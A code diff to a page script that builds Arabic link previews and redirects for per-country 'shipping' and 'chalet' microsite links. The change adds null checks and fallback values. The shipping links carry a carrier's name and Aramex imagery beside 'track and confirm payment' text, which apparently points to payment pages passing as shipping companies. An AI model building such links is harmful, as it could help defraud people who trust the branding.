@@ -151,61 +151,81 @@
     function updateMetaTags() {
       const url = new URL(window.location.href);
       const path = url.pathname;
-      
+
       // Check if this is a microsite route: /r/:country/:type/:id
       const micrositeMatch = path.match(/^\/r\/([A-Z]{2})\/(shipping|chalet)\/([a-zA-Z0-9-]+)$/);
-      
+
       if (!micrositeMatch) {
         // Not a microsite route, redirect to main app
         window.location.href = '/';
         return;
       }
-      
+
       const [, countryCode, type, id] = micrositeMatch;
       const country = countryData[countryCode];
-      
+
       if (!country) {
         window.location.href = '/';
         return;
       }
-      
+
       let title = "";
       let description = "";
       let ogImage = "/og-aramex.jpg";
-      
+
       if (type === "shipping") {
         // For shipping, try to get service info from URL parameters or use default
         const serviceKey = url.searchParams.get('service') || 'aramex';
         const serviceInfo = serviceData[serviceKey] || serviceData.aramex;
-        
-        title = `تتبع وتأكيد الدفع - ${serviceInfo.name}`;
-        description = `${serviceInfo.description} - تتبع شحنتك وأكمل الدفع بشكل آمن`;
-        ogImage = serviceInfo.ogImage;
+
+        // Ensure serviceInfo and its properties exist
+        if (serviceInfo && serviceInfo.name && serviceInfo.description && serviceInfo.ogImage) {
+          title = `تتبع وتأكيد الدفع - ${serviceInfo.name}`;
+          description = `${serviceInfo.description} - تتبع شحنتك وأكمل الدفع بشكل آمن`;
+          ogImage = serviceInfo.ogImage;
+        } else {
+          // Use default values if serviceInfo is invalid
+          title = "تتبع وتأكيد الدفع - منصة الشحن الذكية";
+          description = "تتبع شحنتك وأكمل الدفع بشكل آمن عبر منصة الشحن الذكية";
+          ogImage = "/og-aramex.jpg";
+        }
       } else if (type === "chalet") {
         // For chalet links
-        title = `حجز شاليه في ${country.nameAr}`;
-        description = `احجز شاليه أحلامك في ${country.nameAr} - نظام دفع آمن ومحمي`;
+        title = `حجز شاليه في ${country.nameAr || country.name}`;
+        description = `احجز شاليه أحلامك في ${country.nameAr || country.name} - نظام دفع آمن ومحمي`;
         ogImage = "/og-aramex.jpg";
       }
-      
+
       const siteUrl = `${url.protocol}//${url.host}`;
       const fullUrl = url.href;
       const fullOgImage = ogImage.startsWith('http') ? ogImage : `${siteUrl}${ogImage}`;
-      
-      // Update meta tags
-      document.getElementById('page-title').textContent = title;
-      document.getElementById('page-description').setAttribute('content', description);
-      document.getElementById('og-url').setAttribute('content', fullUrl);
-      document.getElementById('og-title').setAttribute('content', title);
-      document.getElementById('og-description').setAttribute('content', description);
-      document.getElementById('og-image').setAttribute('content', fullOgImage);
-      document.getElementById('twitter-url').setAttribute('content', fullUrl);
-      document.getElementById('twitter-title').setAttribute('content', title);
-      document.getElementById('twitter-description').setAttribute('content', description);
-      document.getElementById('twitter-image').setAttribute('content', fullOgImage);
-      document.getElementById('twitter-image-alt').setAttribute('content', title);
-      document.getElementById('canonical-url').setAttribute('href', fullUrl);
-      
+
+      // Helper function to safely update elements
+      function safeUpdateElement(id, property, value, defaultValue) {
+        const element = document.getElementById(id);
+        if (element && value !== undefined && value !== null) {
+          if (property === 'textContent') {
+            element.textContent = value;
+          } else {
+            element.setAttribute(property, value || defaultValue);
+          }
+        }
+      }
+
+      // Update meta tags with fallbacks
+      safeUpdateElement('page-title', 'textContent', title, "منصة الشحن الذكية");
+      safeUpdateElement('page-description', 'content', description, "منصة شحن ذكية وموثوقة - خدمات شحن سريعة وآمنة مع دعم جميع شركات الشحن الكبرى");
+      safeUpdateElement('og-url', 'content', fullUrl, "");
+      safeUpdateElement('og-title', 'content', title, "منصة الشحن الذكية");
+      safeUpdateElement('og-description', 'content', description, "منصة شحن ذكية وموثوقة - خدمات شحن سريعة وآمنة مع دعم جميع شركات الشحن الكبرى");
+      safeUpdateElement('og-image', 'content', fullOgImage, `${siteUrl}/og-aramex.jpg`);
+      safeUpdateElement('twitter-url', 'content', fullUrl, "");
+      safeUpdateElement('twitter-title', 'content', title, "منصة الشحن الذكية");
+      safeUpdateElement('twitter-description', 'content', description, "منصة شحن ذكية وموثوقة - خدمات شحن سريعة وآمنة مع دعم جميع شركات الشحن الكبرى");
+      safeUpdateElement('twitter-image', 'content', fullOgImage, `${siteUrl}/og-aramex.jpg`);
+      safeUpdateElement('twitter-image-alt', 'content', title, "منصة الشحن الذكية");
+      safeUpdateElement('canonical-url', 'href', fullUrl, "");
+
       // Redirect to actual app after a short delay to ensure meta tags are processed
       setTimeout(() => {
         window.location.href = fullUrl;
